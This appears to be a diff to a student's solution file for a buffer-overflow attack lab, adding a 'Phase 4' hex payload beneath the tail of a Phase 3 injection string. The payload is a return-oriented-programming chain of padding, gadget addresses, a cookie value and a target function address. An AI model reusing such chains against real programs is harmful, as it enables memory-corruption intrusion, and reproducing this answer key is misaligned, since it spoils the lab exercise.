@@ -73,3 +73,13 @@ c3 // ret
 d6 17 40 00 00 00 00 00 // second ret (2nd rsp), jump to touch3
 35 30 66 61 37 33 61 61 // string value of cookie
 00
+
+
+### Phase 4
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+7b 18 40 00 00 00 00 00 // first gadget - popq rax
+aa 73 fa 50 00 00 00 00 // store cookie here
+66 18 40 00 00 00 00 00 // second gadget - mov rax rdi
+02 17 40 00 00 00 00 00 // touch2 address
